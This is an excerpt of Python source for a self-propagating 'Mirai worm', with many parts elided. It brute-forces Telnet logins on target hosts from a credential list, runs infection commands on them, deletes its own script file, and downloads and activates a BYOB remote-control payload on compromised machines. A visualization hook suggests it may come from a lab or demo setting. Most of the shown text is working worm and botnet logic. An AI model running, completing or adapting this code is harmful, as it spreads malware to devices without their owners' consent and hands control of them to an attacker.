...
ROUND_INTERVAL = 2  # Seconds between infection rounds
TARGETS_PER_ROUND = 2
MAX_CONCURRENCY = 10
...
MAX_SUCCESSFUL_MIRAI_INFECTIONS_FOR_BYOB = MAX_INFECT_PER_HOST_MIRAI
...
def check_stop():
    ...
    if cmd == 'stop':
        ...
        subprocess.run([f"rm -f /tmp/mirai.py"], shell=True)
        if os.path.isfile("/map-plugins/submit_event.sh"):
            # subprocess.run([f"""for i in {{1..3}}; do {DISPLAY.format('restore')}; sleep 5; done"""], shell=True)
            subprocess.run([f"sleep 5 && {DISPLAY.format('restore')}"], shell=True)
        return True
    else:
        return False
...
async def activate_byob_payload_on_host():
    ...
    if os.path.exists(BYOB_ACTIVATED_FLAG_FILE):
        logging.info(
            c(f"BYOB payload has already been activated on this host ({BYOB_ACTIVATED_FLAG_FILE} exists).", "Y"))
        return True
    ...
    try:
        ...
        if process_dl.returncode == 0 and os.path.exists(BYOB_PAYLOAD_PATH_TMP):
            ...
            if process_chmod.returncode != 0:
                logging.error(
                    c(f"Failed to chmod {BYOB_PAYLOAD_PATH_TMP}, return code: {process_chmod.returncode}", "R"))
                return False
...
async def infect_mirai_on_target(ip):
    ...
    for user, pwd in MIRAI_CREDS:
        ...
        try:
            ...
            for cmd_idx, cmd_str in enumerate(cmds):
                ...
                if cmd_str.lower() != "exit":
                    try:
                        ...
                        # 如果第一个命令就遇到EOF（因为exit了），说明文件已存在
                        if cmd_idx == 0:
                            logging.debug(f"Telnet: File already exists on {ip}, skipping")
                            break
                        else:
                            logging.error(
                                f"Telnet: Unexpected EOF on {ip} while executing command {cmd_idx + 1}: {str(e)}"
                            )
                else:
            ...
            logging.error(
                c(f"Telnet: An unexpected error occurred while infecting {ip} ({user}/{pwd}): {type(e_infect).__name__} - {e_infect}",
                  "R"))
        finally:
            if writer and not writer.is_closing():
                writer.close()
...
def visualize(on=True):
    if on:
        ...
        if os.path.isfile("/map-plugins/submit_event.sh"):
            subprocess.run(["sleep 5 && " + DISPLAY.format("restore")], shell=True)
        else:
            subprocess.run([f"pkill ping"], shell=True)  # kill the ping process if any
...
async def main():
    ...
    while mirai_propagation_active:
        try:
            ...
            logging.info(
                c(f"Pool remaining: ~{len(NET_PREFIXES) * len(HOST_IDS) - len(mirai_infected_targets) - len(unreachable_hosts)}",
                  "C"))
            ...
            logging.error(c(f"Error in main loop: {e}", "R"))
            print(c(f"Error in main loop: {e}", "R"))
            continue
    ...
    logging.info(
        c("Mirai worm script main task finished. The BYOB payload (if successful) should now be in control.", "C"))
